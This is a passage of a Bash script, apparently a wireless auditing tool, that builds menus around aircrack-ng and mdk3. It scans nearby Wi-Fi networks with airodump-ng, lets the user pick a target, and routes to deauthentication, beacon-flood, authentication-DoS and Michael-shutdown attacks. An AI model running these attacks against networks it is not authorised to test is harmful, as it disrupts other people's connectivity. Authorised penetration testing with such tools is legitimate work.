	language_strings $language 34 "yellow"

	ask_bssid
	exec_authdos
}

function michael_shutdown_option() {

	echo
	language_strings $language 100 "titlered"
	language_strings $language 40 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings $language 34 "yellow"

	ask_bssid
	exec_michaelshutdown
}

function print_selections() {

	if [ -z "$interface" ]; then
		language_strings $language 41 "blue"
		echo
		language_strings $language 115 "read"
		select_interface
		menu_options
	else
		check_interface_mode
		language_strings $language 42 "blue"
	fi

	if [ -n "$bssid" ]; then
		language_strings $language 43 "blue"
		if [ -n "$channel" ]; then
			language_strings $language 44 "blue"
		fi
		if [ -n "$essid" ]; then
			if [ "$essid" = "(Hidden Network)" ]; then
				language_strings $language 45 "blue"
			else
				language_strings $language 46 "blue"
			fi
		fi
	fi
}

function menu_options() {

	clear
	language_strings $language 101 "titlered"
	current_menu="main"
	print_selections
	echo
	language_strings $language 47 "green"
	echo_blue "---------"
	language_strings $language 48
	language_strings $language 49
	language_strings $language 50 "blue"
	language_strings $language 51
	language_strings $language 52
	language_strings $language 53
	echo_blue "---------"
	language_strings $language 54
	echo_blue "---------"
	language_strings $language 55
	language_strings $language 56
	echo_blue "---------"
	language_strings $language 60
	language_strings $language 78
	language_strings $language 61
	read option

	case $option in
		1)
			select_interface
		;;
		2)
			explore_neighbourhood_option
		;;
		3)
			mdk3_deauth_option
		;;
		4)
			aireplay_deauth_option
		;;
		5)
			wds_confusion_option
		;;
		6)
			old_attacks_menu
		;;
		7)
			monitor_option
		;;
		8)
			managed_option
		;;
		9)
			credits_option
		;;
		10)
			language_option
		;;
		11)
			exit_script_option
		;;
		*)
			invalid_menu_option
		;;
	esac

	menu_options
}

function old_attacks_menu() {

	clear
	language_strings $language 102 "titlered"
	current_menu="old"
	print_selections
	echo
	language_strings $language 47 "green"
	echo_blue "---------"
	language_strings $language 48
	language_strings $language 49
	language_strings $language 50 "blue"
	language_strings $language 62
	language_strings $language 63
	language_strings $language 64
	echo_blue "---------"
	language_strings $language 57
	language_strings $language 58
	echo_blue "---------"
	language_strings $language 59
	language_strings $language 60
	language_strings $language 78
	language_strings $language 61

	read oldoption

	case $oldoption in
		1)
			select_interface
		;;
		2)
			explore_neighbourhood_option
		;;
		3)
			beacon_flood_option
		;;
		4)
			auth_dos_option
		;;
		5)
			michael_shutdown_option
		;;
		6)
			monitor_option
		;;
		7)
			managed_option
		;;
		8)
			return
		;;
		9)
			credits_option
		;;
		10)
			language_option
		;;
		11)
			exit_script_option
		;;
		*)
			invalid_menu_option
		;;
	esac
	old_attacks_menu
}

function explore_neighbourhood_option() {

	echo
	language_strings $language 103 "titlered"
	language_strings $language 65 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings $language 66 "yellow"
	echo
	language_strings $language 67 "yellow"
	language_strings $language 115 "read"

	rm -rf /tmp/nws* > /dev/null 2>&1
	rm -rf /tmp/clts.csv > /dev/null 2>&1
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "Exploring neighbourhood" -e airodump-ng -w /tmp/nws $interface
	targetline=`cat /tmp/nws-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	targetline=`expr $targetline - 1`

	head -n $targetline /tmp/nws-01.csv &> /tmp/nws.csv
	tail -n +$targetline /tmp/nws-01.csv &> /tmp/clts.csv

	csvline=`wc -l /tmp/nws.csv | awk '{print $1}'`
	if [ $csvline -le 3 ]; then
		echo
		language_strings $language 68 "yellow"
		language_strings $language 115 "read"
		return
	fi

	rm -rf /tmp/nws.txt > /dev/null 2>&1
	rm -rf /tmp/wnws.txt > /dev/null 2>&1
	i=0
	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do

		chars_mac=${#MAC}
		if [ $chars_mac -ge 17 ]; then
			i=$(($i+1))
			if [[ $POWER -lt 0 ]]; then
				if [[ $POWER -eq -1 ]]; then
					POWER=0
				else
					POWER=`expr $POWER + 100`
				fi
			fi

			POWER=`echo $POWER | awk '{gsub(/ /,""); print}'`
			ESSID=`expr substr "$ESSID" 2 $IDLENGTH`
			if [ $CHANNEL -gt 14 ] || [ $CHANNEL -lt 1 ]; then
				CHANNEL=0
			else
				CHANNEL=`echo $CHANNEL | awk '{gsub(/ /,""); print}'`
			fi

			if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ]; then
				ESSID="(Hidden Network)"
			fi
			echo -e "$MAC,$CHANNEL,$POWER,$ESSID" >> /tmp/nws.txt
		fi
	done < /tmp/nws.csv
	sort -t "," -d -k 4 "/tmp/nws.txt" > "/tmp/wnws.txt"
	select_target
}

function select_target() {

	clear
	language_strings $language 104 "titlered"
	language_strings $language 69 "green"
	echo_blue "-------------------------------------------------------"
	i=0
	while IFS=, read MAC CHANNEL POWER ESSID; do

		i=$(($i+1))

		if [ $i -le 9 ]; then
			SPACE1=" "
		else
			SPACE1=""
		fi

		if [[ $CHANNEL -le 9 ]]; then
			SPACE2=" "
			if [[ $CHANNEL -eq 0 ]]; then
				CHANNEL="-"
			fi
		else
			SPACE2=""
		fi

		if [[ "$POWER" = "" ]]; then
			POWER=0
		fi

		if [[ $POWER -le 9 ]]; then
			SPACE4=" "
		else
			SPACE4=""
		fi

		CLIENT=`cat /tmp/clts.csv | grep $MAC`
		if [ "$CLIENT" != "" ]; then
			CLIENT="*"
			SPACE5=""
		else
			SPACE5=" "
		fi

		network_names[$i]=$ESSID
		channels[$i]=$CHANNEL
		macs[$i]=$MAC
		echo -e " $SPACE1$i)$CLIENT  $SPACE5$MAC   $SPACE2$CHANNEL    $SPACE4$POWER%   $ESSID"
	done < "/tmp/wnws.txt"
	echo
	if [ $i -eq 1 ]; then
		language_strings $language 70 "yellow"
		selected_target_network=1
		language_strings $language 115 "read"
	else
		language_strings $language 71
		echo_blue "-------------------------------------------------------"
		language_strings $language 3 "green"
		read selected_target_network
	fi

	while [[ $selected_target_network -lt 1 ]] || [[ $selected_target_network -gt $i ]]; do
		echo
		language_strings $language 72 "yellow"
		echo
		language_strings $language 3 "green"
		read selected_target_network
	done

	essid=${network_names[$selected_target_network]}
	channel=${channels[$selected_target_network]}
	bssid=${macs[$selected_target_network]}
}

function credits_option() {

	clear
	language_strings $language 105 "titlered"
	language_strings $language 73 "green"
	echo -e $blue_color"       ____        ____  __   _______"
	echo -e "___  _/_   | _____/_   |/  |_ \   _  \_______"
	echo -e "\  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \ "
	echo -e " \   / |   |\___ \ |   ||  |  \  \_/   \  | \/"
	echo -e "  \_/  |___/____  >|___||__|   \_____  /__|"
	echo -e "                \/                   \/"$normal_color
	echo -e $green_color"                .-\"\"\"\"-."
	echo -e "               /        \ "
	echo -e "              /_        _\ "
	echo -e "             // \      / \\\\\ "
	echo -e "             |\__\    /__/|"
	echo -e "              \    ||    /"
	echo -e "               \        /"
	echo -e "                \  __  / "
	echo -e "                 '.__.'"
	echo -e "                  |  |"$normal_color
	language_strings $language 74 "blue"
	language_strings $language 75 "blue"
	echo
	language_strings $language 85 "green"
	language_strings $language 107 "green"
	language_strings $language 115 "read"
}

function invalid_language_selected() {

	echo
	language_strings $language 82 "yellow"
	echo
	language_strings $language 115 "read"
	echo
	language_option
}

function invalid_menu_option() {

	echo
	language_strings $language 76 "yellow"
	language_strings $language 115 "read"
}

function invalid_iface_selected() {

	echo
	language_strings $language 77 "yellow"
	echo
	language_strings $language 115 "read"
	echo
	select_interface
}

function killing_script() {

	echo
	echo
	language_strings $language 12 "yellow"
	echo
	language_strings $language 115 "read"

	if [ "$current_menu" = "main" ]; then
		menu_options
	else
		old_attacks_menu
	fi
}

function exit_script_option() {

	echo
	language_strings $language 106 "titlered"
	language_strings $language 11 "blue"
	echo
	exit
}

function airmon_fix() {

	airmon="airmon-ng"

	if hash airmon-zc 2> /dev/null; then
		airmon="airmon-zc"
	fi
}

function iwconfig_fix() {

	iwversion=`iwconfig --version | grep version | awk '{print $4}'`
	iwcmdfix=""
	if [ $iwversion -lt 30 ]; then
		iwcmdfix=" 2> /dev/null | grep Mode: "
	fi
}

function detect_distro() {

	compatible=0
	distro="Unknown Linux"
	airmon_fix

	for i in "${known_compatible_distros[@]}"; do
		uname -a | grep $i -i > /dev/null
		if [ "$?" = "0" ]; then
			distro="${i^}"
			compatible=1
			break
		fi
	done

	if [ $compatible -eq 0 ]; then
		for i in "${known_nondirectly_compatible_distros[@]}"; do
			uname -a | grep $i -i > /dev/null
			if [ "$?" = "0" ]; then
				distro="${i^}"
				compatible=0
				break
			fi
		done
	fi

	echo -e $yellow_color"$distro Linux"$normal_color
	echo

	if [ $compatible -eq 1 ]; then
		return
	fi

	check_compatibility
	if [ $compatible -eq 1 ]; then
		return
	fi

	language_strings $language 115 "read"
	exit_script_option
}

function print_known_distros() {

	for i in "${known_compatible_distros[@]}"; do
		echo -ne $pink_color"${i^} "$normal_color
	done
	echo
}

function check_compatibility() {

	language_strings $language 5 "yellow"
	language_strings $language 108 "yellow"
	language_strings $language 115 "read"
	echo
	language_strings $language 109 "blue"
	toolsok=1
	toolstext=""

	for i in "${essential_tools[@]}"; do
		echo -ne "$i "
		for j in {0..4}; do
			echo -ne "."
			sleep 0.035
		done
		if ! hash $i 2> /dev/null; then
			echo -e $red_color" Error\r"$normal_color
			toolsok=0
		else
			echo -e $green_color" Ok\r"$normal_color
		fi
	done

	if [ $toolsok -eq 0 ]; then
		echo
		language_strings $language 111 "yellow"
		echo
		return
	fi

	language_strings $language 110 "yellow"
	echo
	compatible=1
}

function welcome() {

	clear
	current_menu="main"

	autodetect_language

	language_strings $language 86 "titlered"
	language_strings $language 6 "blue"
	echo
	language_strings $language 7 "green"
	language_strings $language 114 "green"

	if [ $autochanged_language -eq 1 ]; then
		echo
		language_strings $language 2 "yellow"
	fi

	echo
	language_strings $language 8 "blue"
	print_known_distros
	echo
	language_strings $language 9 "blue"
	detect_distro
	language_strings $language 115 "read"

	select_interface
	menu_options
}

function autodetect_language() {

	autochanged_language=0
	lang=`locale | grep LANG | cut -d= -f2 | cut -d_ -f1`

	for lgkey in "${!lang_association[@]}"; do
		if [[ "$lang" = "$lgkey" ]] && [[ "$language" != ${lang_association["$lgkey"]} ]]; then
			autochanged_language=1
			language=${lang_association["$lgkey"]}
			break
		fi
	done
}

function echo_green() {

	echo -e $green_color"$*"$normal_color
}

function echo_blue() {

	echo -e $blue_color"$*"$normal_color
}

function echo_yellow() {

	echo -e $yellow_color"$*"$normal_color
}

function echo_red() {

	echo -e $red_color"$*"$normal_color
}

function echo_pink() {

	echo -e $pink_color"$*"$normal_color
}

trap killing_script INT
welcome